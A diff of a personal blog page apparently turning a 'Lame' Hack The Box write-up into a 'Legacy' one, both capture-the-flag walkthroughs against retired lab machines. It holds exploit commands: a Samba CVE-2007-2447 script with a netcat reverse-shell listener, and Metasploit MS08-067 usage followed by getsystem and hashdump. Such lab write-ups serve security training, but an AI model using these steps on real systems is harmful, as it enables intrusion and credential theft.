@@ -10,9 +10,9 @@
   
   
   
-  <link rel="prev" href="https://hussein-elsayed.github.io/2021/crossfit/" />
-  <link rel="next" href="https://hussein-elsayed.github.io/2021/legacy/" />
-  <link rel="canonical" href="https://hussein-elsayed.github.io/2021/lame/" />
+  <link rel="prev" href="https://hussein-elsayed.github.io/2021/lame/" />
+  
+  <link rel="canonical" href="https://hussein-elsayed.github.io/2021/legacy/" />
   <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
   <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -24,10 +24,10 @@
   <title>
        
        
-           Lame HTB Writeup | Wh1rlw1nd
+           Legacy HTB Writeup | Wh1rlw1nd
        
   </title>
-  <meta name="title" content="Lame HTB Writeup | Wh1rlw1nd">
+  <meta name="title" content="Legacy HTB Writeup | Wh1rlw1nd">
     
   
   <link rel="stylesheet" href="/font/iconfont.css">
@@ -35,19 +35,20 @@
 
 
   <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Lame HTB Writeup"/>
-<meta name="twitter:description" content="This machine is very easy and straight forward using public exploit and then you get root access directly. These machine from retired machines on hackthebox and you need a vip subscribtion to access them. enjoy..
-1. Enumeration:  Nmap scan: nmap -sC -sV 10.10.10.3 -Pn or sudo nmap -sV -O -F --version-light 10.10.10.3   now we know the open ports and running services on them:
- 21 &raquo; ftp 22 &raquo; ssh 139 &raquo; samba 445 &raquo; samba  FTP Enumeration:  let&rsquo;s try loging into ftp using anonymous and empty password just press enter."/>
+<meta name="twitter:title" content="Legacy HTB Writeup"/>
+<meta name="twitter:description" content="This machine mimics a windows legacy (windows xp). it&rsquo;s a straight forward one depends on a public exploit for the (MS08-067) patch leads to RCE and gets us root access directly.
+enjoy..
+1. Enumeration:  Nmap:  $ nmap -sC -sV 10.10.10.4 -Pn     The ports of interest (139, 445).
+2. let&rsquo;s do a vulnerability scan on them:  $ sudo nmap -p139,445 --script vuln 10.10.10.4   It revealed an RCE in the samba version with cve number (2008-4250) or (MS08-067) patch."/>
 
   <script type="application/ld+json">
 {
   "@context": "http://schema.org",
   "@type": "BlogPosting",
-  "headline": "Lame HTB Writeup",
+  "headline": "Legacy HTB Writeup",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https:\/\/hussein-elsayed.github.io\/2021\/lame\/"
+    "@id": "https:\/\/hussein-elsayed.github.io\/2021\/legacy\/"
   },
   "image": {
     "@type": "ImageObject",
@@ -57,10 +58,10 @@
   },
   "genre": "posts",
   "keywords": "Writeups, hackthebox, retired",
-  "wordcount":  216 ,
-  "url": "https:\/\/hussein-elsayed.github.io\/2021\/lame\/",
-  "datePublished": "2021-04-03T20:51:59\u002b02:00",
-  "dateModified": "2021-04-03T20:51:59\u002b02:00",
+  "wordcount":  279 ,
+  "url": "https:\/\/hussein-elsayed.github.io\/2021\/legacy\/",
+  "datePublished": "2021-04-04T23:15:54\u002b02:00",
+  "dateModified": "2021-04-04T23:15:54\u002b02:00",
   
   "publisher": {
     "@type": "Organization",
@@ -132,11 +133,11 @@
       		
 <article class="post-warp">
     <header class="post-header">
-        <h1 class="post-title">Lame HTB Writeup</h1>
+        <h1 class="post-title">Legacy HTB Writeup</h1>
         <div class="post-meta">
             Written by <a href="https://hussein-elsayed.github.io/" rel="author">Wh1rlw1nd</a> with ♥ 
                 <span class="post-time">
-                    on <time datetime=2021-04-03 >3 April 2021</time>
+                    on <time datetime=2021-04-04 >4 April 2021</time>
                 </span>
                 in
                 
@@ -162,90 +163,71 @@
           
           
 
-          <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/1.png" alt="Machine info" class="lazyload"><figcaption class="image-caption">Machine info</figcaption></figure></p>
-<p>This machine is very easy and straight forward using public exploit and then you get root access directly.
-These machine from retired machines on hackthebox and you need a vip subscribtion to access them. enjoy..</p>
+          <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/1.png" alt="Machine info" class="lazyload"><figcaption class="image-caption">Machine info</figcaption></figure></p>
+<p>This machine mimics a windows legacy (windows xp). it&rsquo;s a straight forward one depends on a public exploit for the (MS08-067) patch leads to RCE and gets us root access directly.</p>
+<p>enjoy..</p>
 <h3 id="1-enumeration">1. Enumeration:</h3>
 <ul>
-<li>Nmap scan:
-<code>nmap -sC -sV 10.10.10.3 -Pn</code> or <code>sudo nmap -sV -O -F --version-light 10.10.10.3</code>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
-</ul>
-<p>now we know the open ports and running services on them:</p>
+<li>Nmap:
 <ul>
-<li>21 &raquo; ftp</li>
-<li>22 &raquo; ssh</li>
-<li>139 &raquo; samba</li>
-<li>445 &raquo; samba</li>
-</ul>
-<h3 id="ftp-enumeration">FTP Enumeration:</h3>
-<ul>
-<li>let&rsquo;s try loging into ftp using anonymous and empty password just press enter.</li>
-<li>login successful but i found nothing in there.
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
-</ul>
-<h3 id="searching-for-samba-exploits-locally">searching for samba exploits locally:</h3>
-<ul>
-<li><code>searchsploit samba 3.0.20</code>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
-</ul>
-<p>found exploit for this version of samba that leads to RCE</p>
-<p>let&rsquo;s look at it and know it&rsquo;s cve number to get it online and not using it with metasploit.</p>
-<p><code>nano /usr/share/exploitdb/exploits/unix/remote/16320.rb</code>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<ul>
-<li>cve number &raquo; 2007-2447
-<ul>
-<li>let&rsquo;s search it in google
-found this github python <a href="https://github.com/amriunix/CVE-2007-2447">exploit</a>:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+<li><code>$ nmap -sC -sV 10.10.10.4 -Pn</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
 </ul>
 </li>
 </ul>
-<p>let&rsquo;s install it and its dependencies:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/7.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>The ports of interest (139, 445).</p>
+<h3 id="2-lets-do-a-vulnerability-scan-on-them">2. let&rsquo;s do a vulnerability scan on them:</h3>
 <ul>
-<li>
-<p>usage:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/9.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-</li>
-<li>
-<p>Exploitation:</p>
+<li><code>$ sudo nmap -p139,445 --script vuln 10.10.10.4</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+</ul>
+<p>It revealed an RCE in the samba version with cve number (2008-4250) or (MS08-067) patch.</p>
+<p>let&rsquo;s searchsploit it:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>And it also has lots of exploits on <a href="https://www.exploit-db.com/exploits/40279">exploitdb</a> and <a href="https://blog.rapid7.com/2014/02/03/new-ms08-067/">rapid7</a>.</p>
+<h3 id="3-exploitation">3. Exploitation:</h3>
+<p>let&rsquo;s search for exploits on metasploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">$ msfconsole -q  &gt;&gt; for quite mode openning without banner</span>
+<span style="color:#ae81ff">$ search ms08-067  &gt;&gt; searching with the patch name</span>
+<span style="color:#ae81ff">$ use exploit/windows/smb/ms08_067_netapi  &gt;&gt; to use the found exploit</span>
+<span style="color:#f92672">then</span>:
+<span style="color:#ae81ff">$ show options &gt;&gt; to see what options to customize</span>
+<span style="color:#ae81ff">$ set rhosts 10.10.10.4 &gt;&gt; machine ip</span>
+<span style="color:#ae81ff">$ set lhost 10.10.x.x &gt;&gt; your tunnel ip</span>
+<span style="color:#f92672">finally</span>:
+<span style="color:#ae81ff">$ run or exploit  </span>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <ul>
-<li>
-<p><code>python3 usermap_script.py 10.10.10.3 445 10.10.16.157 9001</code>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-</li>
-<li>
-<p>open netcat on port 9001:</p>
-</li>
+<li>Once we have the meterpreter session, it is slightly more difficult to use commands or enumerate which user we are as it is pre Windows XP SP2 and thus the “whoami” command does not exist yet.</li>
+<li>But we can either use &ldquo;PsExec&rdquo; to get a system shell or simply use the “getsystem” meterpreter command. also using &ldquo;shell&rdquo; command works fine but didn&rsquo;t like it.</li>
 </ul>
-</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">nc -lvnp 9001</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">&gt; getsystem</span>
+<span style="color:#ae81ff">&gt; hashdump</span>
+<span style="color:#ae81ff">&gt; search -f user.txt</span>
+<span style="color:#ae81ff">&gt; sysinfo</span>
+<span style="color:#ae81ff">pwd</span>
+<span style="color:#ae81ff">cd ../../</span>
+<span style="color:#ae81ff">cd Documents\ and\ Settings</span>
+<span style="color:#ae81ff">cd john then cd Desktop</span>
+<span style="color:#ae81ff">cat user.txt</span>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/7.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/9.png" alt="And here we got user.txt flag" class="lazyload"><figcaption class="image-caption">And here we got user.txt flag</figcaption></figure></p>
+<h3 id="getting-roottxt">getting root.txt:</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">search -f root.txt</span>
 
-<span style="color:#f92672">//getting responsive shell</span>:
-<span style="color:#ae81ff">python -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
-
-<span style="color:#ae81ff">id</span>
-
-<span style="color:#f92672">//getting root flag</span>:
-<span style="color:#ae81ff">cd /root</span>
+<span style="color:#ae81ff">cd ../..</span>
+<span style="color:#ae81ff">pwd &gt; Documents\ and\ Settings again</span>
+<span style="color:#ae81ff">then </span>
+<span style="color:#ae81ff">cd Administrator</span>
+<span style="color:#ae81ff">cd Desktop</span>
 <span style="color:#ae81ff">cat root.txt</span>
-
-<span style="color:#ae81ff">find /home user.txt</span>
-<span style="color:#ae81ff">cat /home/makis/user.txt</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/11.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/12.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<ul>
-<li>getting user flag:</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">find /home user.txt</span>
-<span style="color:#ae81ff">cat /home/makis/user.txt</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/lame/13.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<p>And that&rsquo;s it, hope you enjoyed..</p>
-<p>if so kindly give me respect <a href="https://www.hackthebox.eu/home/users/profile/182588">Wh1rlw1nd-HTB</a>.</p>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/11.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/legacy/12.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<p>And that&rsquo;s it.. hope you enjoyed..</p>
+<p>If so Kindly give me respect <a href="https://www.hackthebox.eu/home/users/profile/182588">Wh1rlw1nd-HTB</a>.</p>
 
     </div>
 
@@ -259,7 +241,7 @@ found this github python <a href="https://github.com/amriunix/CVE-2007-2447">exp
            
             <p class="copyright-item">
                     <span>Words:</span>
-                   <span>216</span>
+                   <span>279</span>
             </p>
             
             <p class="copyright-item">
@@ -268,13 +250,13 @@ found this github python <a href="https://github.com/amriunix/CVE-2007-2447">exp
                 <span>
 
       
-        <a href="//twitter.com/share?url=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flame%2f&amp;text=Lame%20HTB%20Writeup&amp;via=Wh1r1w1nd" target="_blank" title="Share on Twitter">
+        <a href="//twitter.com/share?url=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flegacy%2f&amp;text=Legacy%20HTB%20Writeup&amp;via=Wh1r1w1nd" target="_blank" title="Share on Twitter">
           <i class="iconfont icon-twitter"></i>
         </a>
         
       
       
-        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flame%2f" target="_blank" title="Share on Facebook">
+        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flegacy%2f" target="_blank" title="Share on Facebook">
           <i class="iconfont icon-facebook"></i>
         </a>
         
@@ -282,7 +264,7 @@ found this github python <a href="https://github.com/amriunix/CVE-2007-2447">exp
       
       
       
-        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flame%2f&amp;title=Lame%20HTB%20Writeup" target="_blank" title="Share on LinkedIn">
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fhussein-elsayed.github.io%2f2021%2flegacy%2f&amp;title=Legacy%20HTB%20Writeup" target="_blank" title="Share on LinkedIn">
           <i class="iconfont icon-linkedin"></i>
         </a>
         
@@ -336,10 +318,8 @@ found this github python <a href="https://github.com/amriunix/CVE-2007-2447">exp
 
     <div class="post-nav">
         
-        <a href="https://hussein-elsayed.github.io/2021/crossfit/" class="prev" rel="prev" title="CrossFit HTB Writeup"><i class="iconfont icon-dajiantou"></i>&nbsp;CrossFit HTB Writeup</a>
+        <a href="https://hussein-elsayed.github.io/2021/lame/" class="prev" rel="prev" title="Lame HTB Writeup"><i class="iconfont icon-dajiantou"></i>&nbsp;Lame HTB Writeup</a>
          
-        
-        <a href="https://hussein-elsayed.github.io/2021/legacy/" class="next" rel="next" title="Legacy HTB Writeup">Legacy HTB Writeup&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
         
     </div>
 
